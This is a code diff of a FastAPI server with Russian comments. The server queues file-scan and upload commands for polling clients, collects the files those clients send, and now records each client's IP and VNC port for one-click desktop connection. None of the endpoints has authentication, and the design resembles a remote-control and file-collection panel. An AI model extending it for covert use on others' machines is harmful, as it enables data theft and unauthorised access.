@@ -19,6 +19,7 @@ os.makedirs(uploaded_files_dir, exist_ok=True)
 pending_commands: Dict[str, List[dict]] = {}     # команды для клиентов
 client_files: Dict[str, List[dict]] = {}         # списки файлов от клиентов
 uploaded_files_metadata: List[dict] = []         # метаданные загруженных файлов
+clients_registry: Dict[str, dict] = {}           # client_id → {ip, vnc_port, vnc_status, last_seen}
 
 # Модели
 class ScanCommand(BaseModel):
@@ -32,6 +33,12 @@ class CommandResponse(BaseModel):
     command_id: str
     type: str
     status: str
+
+class ClientStatus(BaseModel):
+    client_id: str
+    ip: str
+    vnc_port: int
+    vnc_status: str  # "running" / "stopped"
 
 # 1. Запросить сканирование файлов
 @app.post("/command/scan", response_model=CommandResponse)
@@ -58,12 +65,7 @@ async def create_upload_command(cmd: UploadCommand):
     }
     pending_commands.setdefault(cmd.client_id, []).append(new_command)
     print(f"[+] UPLOAD команда для {cmd.client_id}: {cmd.filepath}")
-    return CommandResponse(
-        command_id=command_id,
-        type="upload",
-        status="pending",
-        message="Команда загрузки создана. Клиент выполнит её при следующем опросе."
-    )
+    return CommandResponse(command_id=command_id, type="upload", status="pending")
 
 # 3. Получить команды для клиента
 @app.get("/commands/{client_id}")
@@ -81,7 +83,6 @@ async def report_files(client_id: str = Form(...), files_json: str = Form(...)):
             {"filepath": f, "reported_at": datetime.now().isoformat()} for f in files_list
         ]
 
-        # Помечаем команду scan как выполненную
         if client_id in pending_commands:
             for cmd in pending_commands[client_id]:
                 if cmd["type"] == "scan" and cmd["status"] == "pending":
@@ -100,12 +101,28 @@ async def report_files(client_id: str = Form(...), files_json: str = Form(...)):
 async def get_client_files(client_id: str):
     return {"client_id": client_id, "files": client_files.get(client_id, [])}
 
-# 6. API: получить список загруженных файлов
+# 6. API: получить список всех клиентов (с IP и статусом VNC)
+@app.get("/api/clients")
+async def get_all_clients():
+    return {"clients": clients_registry}
+
+# 7. Клиент отправляет свой IP и статус VNC
+@app.post("/client/status")
+async def receive_client_status(status: ClientStatus):
+    clients_registry[status.client_id] = {
+        "ip": status.ip,
+        "vnc_port": status.vnc_port,
+        "vnc_status": status.vnc_status,
+        "last_seen": datetime.now().isoformat()
+    }
+    return {"status": "ok"}
+
+# 8. API: получить список загруженных файлов
 @app.get("/api/downloaded-files")
 async def get_downloaded_files():
     return {"files": uploaded_files_metadata}
 
-# 7. Загрузка файла от клиента → сохраняем на сервере
+# 9. Загрузка файла от клиента
 @app.post("/upload/")
 async def upload_file(
     command_id: str = Form(...),
@@ -118,24 +135,20 @@ async def upload_file(
     if not command:
         raise HTTPException(status_code=404, detail="Command not found")
 
-    # Генерируем безопасное имя
     safe_filename = file.filename.replace("/", "_").replace("\\", "_")
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     save_path = os.path.join(uploaded_files_dir, f"{client_id}_{timestamp}_{safe_filename}")
 
-    # Сохраняем файл
     content = await file.read()
     with open(save_path, "wb") as f:
         f.write(content)
 
-    # Обновляем статус команды
     command["status"] = "completed"
     command["saved_as"] = save_path
     command["filename"] = file.filename
     command["size"] = len(content)
     command["completed_at"] = datetime.now().isoformat()
 
-    # Добавляем в историю
     uploaded_files_metadata.append({
         "command_id": command_id,
         "client_id": client_id,
@@ -152,7 +165,7 @@ async def upload_file(
         "message": "Файл успешно загружен на сервер"
     }
 
-# 8. Скачать файл на свой компьютер
+# 10. Скачать файл
 @app.get("/download/{command_id}")
 async def download_file(command_id: str):
     file_record = next((f for f in uploaded_files_metadata if f["command_id"] == command_id), None)
@@ -166,7 +179,7 @@ async def download_file(command_id: str):
         media_type="application/octet-stream"
     )
 
-# 9. Главная страница — веб-интерфейс
+# 11. Главная страница
 @app.get("/", response_class=HTMLResponse)
 async def main_page():
     return """
@@ -185,6 +198,8 @@ async def main_page():
             .btn:hover { background: #218838; }
             .btn-upload { background: #007bff; }
             .btn-upload:hover { background: #0056b3; }
+            .vnc-ok { color: green; }
+            .vnc-down { color: red; }
         </style>
         </head>
         <body>
@@ -195,6 +210,7 @@ async def main_page():
                     <button onclick="scanFiles()">🔍 Запросить список файлов Access</button>
                 </div>
 
+                <div id="clientsInfo" class="section"></div>
                 <div id="filesContainer" class="section"></div>
 
                 <div class="section">
@@ -218,6 +234,37 @@ async def main_page():
                     loadFiles();
                 }
 
+                async function loadClientsInfo() {
+                    const clientId = document.getElementById('clientId').value;
+                    const res = await fetch('/api/clients');
+                    const allClients = await res.json();
+                    const clientData = allClients.clients[clientId];
+                    const container = document.getElementById('clientsInfo');
+
+                    if (clientData) {
+                        const vncStatus = clientData.vnc_status === "running" 
+                            ? '<span class="vnc-ok">✅ VNC работает</span>' 
+                            : '<span class="vnc-down">❌ VNC не отвечает</span>';
+                        container.innerHTML = `
+                            <h3>📡 Информация о клиенте: ${clientId}</h3>
+                            <p><strong>IP:</strong> ${clientData.ip} | <strong>Порт VNC:</strong> ${clientData.vnc_port}</p>
+                            <p>${vncStatus}</p>
+                            <button class="btn btn-upload" onclick="connectVNC('${clientData.ip}', ${clientData.vnc_port})">
+                                🖥️ Подключиться по VNC
+                            </button>
+                        `;
+                    } else {
+                        container.innerHTML = `
+                            <h3>📡 Информация о клиенте: ${clientId}</h3>
+                            <p>Клиент ещё не отправил свой IP. Убедитесь, что клиент запущен.</p>
+                        `;
+                    }
+                }
+
+                function connectVNC(ip, port) {
+                    window.location.href = 'vnc://' + ip + ':' + port;
+                }
+
                 async function loadFiles() {
                     const clientId = document.getElementById('clientId').value;
                     const res = await fetch('/client/' + clientId + '/files');
@@ -225,7 +272,7 @@ async def main_page():
 
                     const container = document.getElementById('filesContainer');
                     container.innerHTML = `
-                        <h3>Файлы клиента: ${clientId}</h3>
+                        <h3>📁 Файлы клиента: ${clientId}</h3>
                         ${data.files.length ? data.files.map(f => `
                             <div class="file-item">
                                 <div class="file-info">
@@ -247,12 +294,8 @@ async def main_page():
                         body: JSON.stringify({client_id: clientId, filepath: decodeURIComponent(filepath)})
                     });
                     const data = await res.json();
-                    if (data.status === "success") {
-                        alert("✅ " + data.message);  // ← ИСПРАВЛЕНО: теперь data.message существует
-                        loadDownloadedFiles();
-                    } else {
-                        alert("❌ Ошибка: " + (data.message || "Неизвестная ошибка"));
-                    }
+                    alert(data.message || "Команда загрузки создана.");
+                    loadDownloadedFiles();
                 }
 
                 async function loadDownloadedFiles() {
@@ -274,11 +317,13 @@ async def main_page():
                 }
 
                 // Загружаем при открытии
+                loadClientsInfo();
                 loadFiles();
                 loadDownloadedFiles();
 
                 // Автообновление каждые 10 сек
                 setInterval(() => {
+                    loadClientsInfo();
                     loadFiles();
                     loadDownloadedFiles();
                 }, 10000);
